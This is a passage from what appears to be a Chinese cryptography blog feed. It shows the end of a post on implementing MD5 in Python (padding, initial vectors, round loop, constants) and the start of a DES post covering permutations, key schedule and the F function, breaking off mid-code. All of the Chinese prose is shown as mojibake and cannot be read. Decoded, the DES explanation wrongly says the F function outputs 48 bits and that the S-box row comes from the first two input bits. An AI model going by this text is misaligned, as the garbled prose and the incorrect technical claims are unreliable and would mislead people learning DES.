ä¸Šè¿™ä¸€å¯¹å¡«å……çš„ä¸œè¥¿é•¿åº¦åº”è¯¥æ˜¯448ï¼Œè¿˜å‰©ä¸‹64ä½æ˜¯æ¶ˆæ¯çš„é•¿åº¦ï¼Œæ»¡è¶³L mod 2^64,ä¸‹å›¾å°±å¾ˆæ¸…æ¥šè§£é‡Šäº†è¿™ä¸€è¿‡ç¨‹ï¼š</p><p><img src="https://s1.ax1x.com/2018/12/25/Fgu4hD.png" alt="Fgu4hD.png"></p><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">length = struct.pack(<span class="string">'&lt;Q'</span>, len(message)*<span class="number">8</span>)  <span class="comment">#åŸæ¶ˆæ¯é•¿åº¦64ä½æ¯”ç‰¹çš„æ·»åŠ æ ¼å¼ï¼Œå¤ªéªšé¢è¿™ç§å†™æ³•</span></span><br><span class="line">   <span class="keyword">while</span> len(message) &gt; <span class="number">64</span>:</span><br><span class="line">       solve(message[:<span class="number">64</span>])</span><br><span class="line">       message = message[<span class="number">64</span>:]</span><br><span class="line">   <span class="comment">#é•¿åº¦ä¸è¶³64ä½æ¶ˆæ¯è‡ªè¡Œå¡«å……</span></span><br><span class="line">   message += <span class="string">'\x80'</span></span><br><span class="line">   message += <span class="string">'\x00'</span> * (<span class="number">56</span> - len(message) % <span class="number">64</span>)</span><br><span class="line">   <span class="comment">#print type(length)</span></span><br><span class="line">   message += length</span><br><span class="line">   solve(message[:<span class="number">64</span>])</span><br></pre></td></tr></table></figure><h4 id="åˆå§‹åŒ–é“¾æ¥å˜é‡"><a href="#åˆå§‹åŒ–é“¾æ¥å˜é‡" class="headerlink" title="åˆå§‹åŒ–é“¾æ¥å˜é‡"></a>åˆå§‹åŒ–é“¾æ¥å˜é‡</h4><p>ä½¿ç”¨4ä¸ª32ä½çš„å¯„å­˜å™¨Aï¼Œ Bï¼ŒCï¼Œ Då­˜æ”¾4ä¸ªå›ºå®šçš„32ä½æ•´å‹å‚æ•°ï¼Œç”¨äºç¬¬ä¸€è½®è¿­ä»£ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œä¹¦æœ¬ä¸Šçš„å€¼æ˜¯ç›´æ¥ç»™ä½ çš„ï¼Œä½†æ˜¯æ²¡æœ‰å€’è¿‡æ¥ï¼Œä¹Ÿå°±æ˜¯å¤§ç«¯å’Œå°ç«¯çš„è½¬æ¢é—®é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åˆå§‹å‘é‡</span></span><br><span class="line">A, B, C, D = (<span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span>)</span><br><span class="line"><span class="comment"># A, B, C, D = (0x01234567, 0x89ABCDEF, 0xFEDCBA98, 0x76543210)</span></span><br></pre></td></tr></table></figure><h4 id="åˆ†ç»„å¤„ç†"><a href="#åˆ†ç»„å¤„ç†" class="headerlink" title="åˆ†ç»„å¤„ç†"></a>åˆ†ç»„å¤„ç†</h4><p>ä¸åˆ†ç»„å¯†ç åˆ†ç»„å¤„ç†ç›¸ä¼¼ï¼Œæœ‰4è½®æ­¥éª¤ï¼Œå°†512æ¯”ç‰¹çš„æ¶ˆæ¯åˆ†ç»„å¹³å‡åˆ†ä¸º16ä¸ªå­åˆ†ç»„ï¼Œæ¯ä¸ªå­åˆ†ç»„æœ‰32æ¯”ç‰¹ï¼Œå‚ä¸æ¯ä¸€è½®çš„çš„16æ­¥è¿ç®—ï¼Œæ¯æ­¥è¾“å…¥æ˜¯4ä¸ª32æ¯”ç‰¹çš„é“¾æ¥å˜é‡å’Œä¸€ä¸ª32ä½çš„çš„æ¶ˆæ¯å­åˆ†ç»„ï¼Œç»è¿‡è¿™æ ·çš„64æ­¥ä¹‹åå¾—åˆ°4ä¸ªå¯„å­˜å™¨çš„å€¼åˆ†åˆ«ä¸è¾“å…¥çš„é“¾æ¥å˜é‡è¿›è¡Œæ¨¡åŠ ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼Œä¸ºäº†èƒ½å¤Ÿä¿å­˜ä¸€ä¸‹ä¸€å¼€å§‹Aï¼ŒBï¼ŒCï¼ŒDè¿™å››ä¸ªåˆå§‹å˜é‡çš„å€¼ï¼Œæ‰€ä»¥å°±å…ˆæ‰¾å››ä¸ªå˜é‡æŠŠä»–ä»¬çš„å€¼æš‚å­˜ä¸€ä¸‹ï¼Œä¸ºæœ€åä¸€æ­¥çš„æ¨¡åŠ åšå‡†å¤‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(chunk)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> A</span><br><span class="line">    <span class="keyword">global</span> B</span><br><span class="line">    <span class="keyword">global</span> C</span><br><span class="line">    <span class="keyword">global</span> D</span><br><span class="line">    w = list(struct.unpack(<span class="string">'&lt;'</span> + <span class="string">'I'</span> * <span class="number">16</span>, chunk))  <span class="comment">#åˆ†æˆ16ä¸ªç»„ï¼ŒIä»£è¡¨1ç»„32ä½,tql,å­¦åˆ°äº†</span></span><br><span class="line">    a, b, c, d = A, B, C, D</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):  <span class="comment">#64è½®è¿ç®—</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">16</span>:  <span class="comment">#æ¯ä¸€è½®è¿ç®—åªç”¨åˆ°äº†b,c,dä¸‰ä¸ª</span></span><br><span class="line">            f = ( b &amp; c)|((~b) &amp; d)</span><br><span class="line">            flag  = i      <span class="comment">#ç”¨äºæ ‡è¯†å¤„äºç¬¬å‡ ç»„ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">32</span>:</span><br><span class="line">            f = (b &amp; d)|(c &amp; (~d))</span><br><span class="line">            flag = (<span class="number">5</span> * i +<span class="number">1</span>) %<span class="number">16</span></span><br><span class="line">        <span class="keyword">elif</span> i &lt; <span class="number">48</span>:</span><br><span class="line">            f = (b ^ c ^ d)</span><br><span class="line">            flag  = (<span class="number">3</span> * i + <span class="number">5</span>)% <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f = c ^(b |(~d))</span><br><span class="line">            flag  = (<span class="number">7</span> * i ) % <span class="number">16</span></span><br><span class="line">        tmp = b + lrot((a + f + k[i] + w[flag])&amp; <span class="number">0xffffffff</span>,r[i]) <span class="comment">#&amp;0xffffffffä¸ºäº†ç±»å‹è½¬æ¢</span></span><br><span class="line">        a, b, c, d = d, tmp &amp; <span class="number">0xffffffff</span>, b, c</span><br><span class="line">        <span class="comment">#print(hex(a).replace("0x","").replace("L",""), hex(b).replace("0x","").replace("L","") , hex(c).replace("0x","").replace("L",""), hex(d).replace("0x","").replace("L",""))</span></span><br><span class="line">    A = (A + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    B = (B + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    C = (C + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    D = (D + d) &amp; <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸Šé¢çš„ä»£ç ä¹ŸåŒ…å«äº†ç¬¬å››æ­¥çš„æ­¥å‡½æ•°ï¼Œå¯ä»¥å•ç‹¬æŠŠä»–ä»¬æå–å‡ºæ¥ï¼Œè€Œä¸åŒè½®ä½¿ç”¨çš„æ­¥å‡½æ•°ä½¿ç”¨çš„éçº¿æ€§å‡½æ•°æ˜¯ä¸ä¸€æ ·çš„ã€‚å³å››è½®ä½¿ç”¨å››ä¸ªä¸åŒçš„éçº¿æ€§å‡½æ•°ï¼Œå…¶å®å¯ä»¥å‘ç°æ¯ä¸ªéçº¿æ€§å‡½æ•°çš„è¾“å…¥ä¸éœ€è¦Aå¯„å­˜å™¨é‡Œé¢çš„å€¼ï¼Œæˆ‘ä»¬åªéœ€è¦Bï¼ŒCï¼ŒDå¯„å­˜å™¨é‡Œé¢çš„ä¸œè¥¿ï¼Œè¿™é‡Œé¢å¾—å‡ºæ¥çš„ç»“æœåˆ†åˆ«æ”¾è¿›Aï¼ŒCï¼ŒDå¯„å­˜å™¨ï¼Œæ‰€ä»¥ä¸€å¼€å§‹æ‰è¦æ‰¾å¦å¤–çš„å¯„å­˜å™¨å»å­˜å‚¨æœ¬èº«çš„å€¼ï¼Œä¸ç„¶çš„è¯åœ¨è½¬åŒ–è¿‡ç¨‹ä¸­æœ¬èº«çš„å˜é‡ä¼šä¸¢å¤±ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = ( b &amp; c)|((~b) &amp; d)</span><br><span class="line">f = (b &amp; d)|(c &amp; (~d))</span><br><span class="line">f = (b ^ c ^ d)</span><br><span class="line">f = c ^(b |(~d))</span><br></pre></td></tr></table></figure><p>Aå¯„å­˜å™¨é‡Œé¢çš„å€¼çš„è¿ç®—æœ‰å¦å¤–è‡ªå·±çš„ä¸€å¥—æ¨¡å¼ï¼Œå…ˆç”¨Bï¼ŒCï¼ŒDå‘é‡é‡Œé¢åšä¸€æ¬¡éçº¿æ€§çš„è¿ç®—ï¼Œç„¶åå°†å¾—å‡ºæ¥çš„ç»“æœä¾æ¬¡åŠ ä¸Šç¬¬ä¸€ä¸ªå˜é‡ï¼Œ32æ¯”ç‰¹çš„æ¶ˆæ¯å’Œä¸€ä¸ªä¼ªéšæœºæ•°å¸¸æ•°ï¼Œå†å°†ç»“æœå¾ªç¯å·¦ç§»æŒ‡å®šçš„ä½æ•°ï¼Œå¹¶åŠ ä¸ŠBçš„å€¼ï¼Œæœ€åæŠŠå¾—å‡ºæ¥çš„ç»“æœæ”¾è¿›Bå¯„å­˜å™¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¾ªç¯å·¦ç§»çš„ä½ç§»ä½æ•°</span></span><br><span class="line">r = [   <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">        <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">         <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span></span><br><span class="line">        ]</span><br><span class="line">lrot = <span class="keyword">lambda</span> x,n: (x &lt;&lt; n)|(x &gt;&gt; <span class="number">32</span>- n)</span><br><span class="line"><span class="comment">#ä½¿ç”¨æ­£å¼¦å‡½æ•°äº§ç”Ÿçš„ä½éšæœºæ•°ï¼Œä¹Ÿå°±æ˜¯ä¹¦æœ¬ä¸Šçš„T[i]</span></span><br><span class="line">k =  [int(math.floor(abs(math.sin(i + <span class="number">1</span>)) * (<span class="number">2</span> ** <span class="number">32</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>)]</span><br><span class="line">tmp = b + lrot((a + f + k[i] + w[flag])&amp; <span class="number">0xffffffff</span>,r[i])</span><br></pre></td></tr></table></figure><h3 id="æ­£ç¡®æ€§"><a href="#æ­£ç¡®æ€§" class="headerlink" title="æ­£ç¡®æ€§"></a>æ­£ç¡®æ€§</h3><p>ä»¥â€helloworldâ€ä¸ºä¾‹ï¼Œåˆ†åˆ«å°†å…¶åœ¨ä»£ç ä¸­è¿è¡Œï¼Œä»¥åŠçº¿ä¸Šå·¥å…·è¿è¡Œï¼Œæ£€æŸ¥å®ƒä»¬çš„ä¸€è‡´æ€§ã€‚</p><p><a href="https://imgchr.com/i/F52mzn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/02/F52mzn.png" alt="F52mzn.png"></a></p><p><a href="https://imgchr.com/i/F52AIg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/02/F52AIg.png" alt="F52AIg.png"></a></p><h3 id="è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šMD5å®ç°"><a href="#è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šMD5å®ç°" class="headerlink" title="è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼šMD5å®ç°"></a>è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼š<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">MD5å®ç°</a></h3>]]></content>
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DESåŸç†åŠPythonå®ç°</title>
      <link href="/DES-python.html"/>
      <url>/DES-python.html</url>
      <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>DESæ˜¯åˆ†ç»„å¯†ç çš„ä¸€ç±»ï¼Œæ˜¯ä¸€ç§å¯¹ç§°å¯†ç æŠ€æœ¯ï¼Œä½¿ç”¨äº†Feistelçš„ç½‘ç»œç»“æ„<a id="more"></a>ï¼Œå°†æ˜æ–‡åˆ†æˆå¤šä¸ªç­‰é•¿æ¨¡å—ï¼Œä½¿ç”¨ç¡®å®šçš„ç®—æ³•ä»¥åŠå¯¹ç§°å¹¶ä¸”ç›¸åŒçš„å¯†é’¥å¯¹æ˜å¯†æ–‡è¿›è¡ŒåŠ è§£å¯†ã€‚</p><p><img src="https://s2.ax1x.com/2019/01/01/F5u1LF.png" alt="F5u1LF.png"></p><h3 id="ç®—æ³•æµç¨‹"><a href="#ç®—æ³•æµç¨‹" class="headerlink" title="ç®—æ³•æµç¨‹"></a>ç®—æ³•æµç¨‹</h3><ol><li>64ä½çš„æ˜æ–‡ç»è¿‡åˆå§‹ç½®æ¢è€Œè¢«é‡æ–°æ’åˆ—ï¼Œå¹¶å°†å…¶åˆ†ä¸ºå·¦å³ä¸¤ä¸ªåˆ†ç»„L0å’ŒR0å„32ä½ã€‚</li><li>åœ¨å¯†é’¥çš„å‚ä¸ä¸‹ï¼Œæœ€å·¦å³ä¸¤ä¸ªåˆ†ç»„è¿›è¡Œ16è½®ç›¸åŒå‡½æ•°çš„è¿­ä»£ï¼Œæ¯è½®è¿­ä»£éƒ½æœ‰ç½®æ¢å’Œä»£æ¢ã€‚æ³¨æ„æœ€åä¸€è½®è¿­ä»£çš„è¾“å‡ºä¸º64ä½ã€‚å·¦åŠéƒ¨åˆ†å’Œå³åŠéƒ¨åˆ†ä¸è¿›è¡Œäº¤æ¢ã€‚</li><li>æœ€åçš„é¢„è¾“å‡ºå†é€šè¿‡é€†åˆå§‹ç½®æ¢äº§ç”Ÿ64ä½çš„å¯†æ–‡ã€‚</li><li>åŠ è§£å¯†è¿‡ç¨‹ä¸€æ ·ï¼Œåè¿‡æ¥å³å¯ï¼Œä¹Ÿå°±æ˜¯ç§˜é’¥åˆ—è¡¨å¾—å€’è¿‡æ¥ã€‚æ‰€ä»¥å¾—æ³¨æ„ä¸€ä¸‹ã€‚</li></ol><h3 id="æ ¸å¿ƒä»£ç åŠç®—æ³•åˆ†æ"><a href="#æ ¸å¿ƒä»£ç åŠç®—æ³•åˆ†æ" class="headerlink" title="æ ¸å¿ƒä»£ç åŠç®—æ³•åˆ†æ"></a>æ ¸å¿ƒä»£ç åŠç®—æ³•åˆ†æ</h3><p>ç¬¬ä¸€éƒ¨ç»è¿‡åˆ†æ˜¯æ˜æ–‡ç»è¿‡IPç½®æ¢çš„æ“ä½œï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥ç”¨ä¸€ç»´æ•°ç»„å»å®Œæˆï¼Œè¿™éœ€è¦æ³¨æ„çš„æ˜¯æ•°ç»„ä¸‹æ ‡ä¸è¦å†™é”™ï¼Œä¼šå¯¼è‡´æ•°ç»„è¶Šç•Œï¼Œæœ€åä¸€éƒ¨åˆ†IPé€†çš„é‚£ä¸€éƒ¨åˆ†ä¹Ÿä¸€æ ·çš„é“ç†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_change</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> IP_table:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]     <span class="comment">#æ•°ç»„ä¸‹æ ‡i-1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#IPé€†ç›’å¤„ç†</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_re_change</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> IP_re_table:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>å†ä¸‹æ¥å°±æ˜¯ç»è¿‡16è½®è¿­ä»£çš„è¿‡ç¨‹ï¼Œæ¯ä¸€æ­¥çš„è¿­ä»£è¿‡ç¨‹é‡Œé¢åˆåŒ…å«äº†Få‡½æ•°ï¼Œè¿˜æœ‰å¯†é’¥çš„äº§ç”Ÿã€‚</p><p>é¦–å…ˆæ˜¯ä¸€ä¸ªå¤§è‡´çš„è¿­ä»£è¿‡ç¨‹ï¼Œå¾ˆæ¸…æ¥šé¦–å…ˆäº§ç”Ÿäº†16è½®è¿­ä»£çš„ç§˜é’¥ï¼Œæ¯ä¸€è½®çš„è¿­ä»£éƒ½æœ‰å¯†é’¥å‚ä¸ï¼Œå¹¶ä¸”é€šè¿‡åˆ‡ç‰‡å®Œæˆäº†æ¯ä¸€è½®çš„å·¦å³åˆ†ç»„ï¼Œç„¶åå³è¾¹çš„åˆ†ç»„ä½œä¸ºäº†æ–°çš„å·¦è¾¹ï¼Œå·¦è¾¹çš„åˆ†ç»„ä»¥åŠå³è¾¹çš„åˆ†ç»„è¿˜æœ‰å¯†é’¥é€šè¿‡Få‡½æ•°çš„è®¡ç®—è·å¾—æ–°çš„å³åˆ†ç»„ï¼Œæœ€åä¸€è½®ä¸åšäº¤æ¢ï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä¸ºä»€ä¹ˆåªå¾ªç¯äº†15è½®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_encrypt_one</span><span class="params">(bin_message,bin_key)</span>:</span> <span class="comment">#64ä½äºŒè¿›åˆ¶åŠ å¯†çš„æµ‹è¯•</span></span><br><span class="line">    <span class="comment">#bin_message = deal_mess(str2bin(message))</span></span><br><span class="line">    mes_ip_bin = ip_change(bin_message)</span><br><span class="line">    <span class="comment">#bin_key = input_key_judge(str2bin(key))</span></span><br><span class="line">    key_lst = gen_key(bin_key)</span><br><span class="line">    mes_left = mes_ip_bin[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    mes_right = mes_ip_bin[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">15</span>):</span><br><span class="line">        mes_tmp = mes_right</span><br><span class="line">        f_result = fun_f(mes_tmp,key_lst[i])</span><br><span class="line">        mes_right = str_xor(f_result,mes_left)</span><br><span class="line">        mes_left = mes_tmp</span><br><span class="line">    f_result = fun_f(mes_right,key_lst[<span class="number">15</span>])</span><br><span class="line">    mes_fin_left = str_xor(mes_left,f_result)</span><br><span class="line">    mes_fin_right = mes_right</span><br><span class="line">    fin_message = ip_re_change(mes_fin_left + mes_fin_right)</span><br><span class="line">    <span class="keyword">return</span> fin_message</span><br></pre></td></tr></table></figure><p>å†çœ‹çœ‹äº§ç”Ÿå¯†é’¥çš„å…³é”®ä»£ç gen_keyï¼Œä¼ è¿›å»çš„å‚æ•°å¯†é’¥å®é™…æ˜¯64ä½çš„ï¼Œä½†å®é™…å‘æŒ¥ä½œç”¨çš„æ˜¯56ä½ï¼Œæ˜¯å› ä¸ºä»…è¿‡äº†ä¸€æ¬¡PC-1çš„ç½®æ¢ï¼Œè¿™ä¹Ÿè§£é‡Šäº†è¿™æ®µä»£ç ä¸ºä»€ä¹ˆåˆ°åé¢åˆ‡ç‰‡çš„æ—¶å€™ä»¥28ä¸ºä¸­å¿ƒåˆ†å·¦å³ã€‚ç„¶åæ ¹æ®æ˜¯ç¬¬å‡ è½®ç„¶åå¯¹å·¦å³åˆ†ç»„çš„å¯†é’¥è¿›è¡Œå¾ªç¯å·¦ç§»ï¼Œå‡ºæ¥çš„56ä½å†ç»è¿‡ä¸€æ¬¡ç½®æ¢ç”Ÿæˆ48ä½çš„å¯†é’¥ï¼Œæœ€åç”¨æ•°ç»„å°†æ‰€æœ‰å¯†é’¥éƒ½è£…å¥½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span><span class="params">(key)</span>:</span></span><br><span class="line">    key_list = []</span><br><span class="line">    divide_output = change_key1(key)</span><br><span class="line">    key_C0 = divide_output[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">    key_D0 = divide_output[<span class="number">28</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> SHIFT:</span><br><span class="line">        key_c = left_turn(key_C0,i)</span><br><span class="line">        key_d = left_turn(key_D0,i)</span><br><span class="line">        key_output = change_key2(key_c + key_d)</span><br><span class="line">        key_list.append(key_output)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br></pre></td></tr></table></figure><p>PC-1ï¼ŒPC-2çš„ç½®æ¢è¿‡ç¨‹ï¼Œè·ŸIPç½®æ¢å·®ä¸å¤šï¼Œéƒ½æ˜¯åˆ©ç”¨äº†æ‰“è¡¨ç„¶åå­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼å®ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç§˜é’¥çš„PC-1ç½®æ¢</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key1</span><span class="params">(my_key)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PC_1:</span><br><span class="line">        res += my_key[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç§˜é’¥çš„PC-2ç½®æ¢</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key2</span><span class="params">(my_key)</span>:</span></span><br><span class="line">    res  = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PC_2:</span><br><span class="line">        res += my_key[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>é‡ç‚¹è¿˜æœ‰Få‡½æ•°çš„å¤„ç†ï¼Œä¹Ÿå³æ˜¯ä»£ç é‡Œé¢çš„fun_fï¼Œè¿™é‡Œé¢ä¸»è¦æœ‰å››ä¸ªæ­¥éª¤ï¼Œåˆ†åˆ«æ˜¯æ‰©å±•ç½®æ¢ï¼Œå¯†é’¥åŠ ï¼Œç»è¿‡Sç›’çš„ä»£æ¢ï¼Œæœ€åç»è¿‡äº†Pç›’çš„ç½®æ¢ï¼Œæœ€ç»ˆæŠŠ32ä½çš„è¾“å…¥å˜æˆ48ä½çš„è¾“å‡ºã€‚Eç›’ä»¥åŠPç›’çš„ç½®æ¢ä¹Ÿæ˜¯å¾ˆç®€å•æ‰“å¥½è¡¨ç„¶åç”¨å­—ç¬¦ä¸²æ‹¼æ¥å°±å¥½ã€‚å…³é”®æ˜¯Sç›’çš„å˜æ¢åŸç†ï¼Œ6ä½çš„è¾“å…¥4ä½çš„è¾“å‡ºï¼Œè¾“å…¥å‰ä¸¤ä½ä½œä¸ºSç›’æ¨ªåæ ‡ï¼Œä¸­é—´4ä½ä½œä¸ºåˆ—ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œæ˜¯ä»¥binè¾“å‡ºå¾—æ³¨æ„ä½æ•°ä¸å¤Ÿå››ä½å¾—è¡¥é½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Få‡½æ•°çš„å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_f</span><span class="params">(bin_str,key)</span>:</span></span><br><span class="line">    first_output = e_key(bin_str)</span><br><span class="line">    second_output = str_xor(first_output,key)</span><br><span class="line">    third_output = s_box(second_output)</span><br><span class="line">    last_output = p_box(third_output)</span><br><span class="line">    <span class="keyword">return</span> last_output</span><br><span class="line"></span><br><span class="line"><span class="comment">#Eç›’ç½®æ¢</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e_key</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span 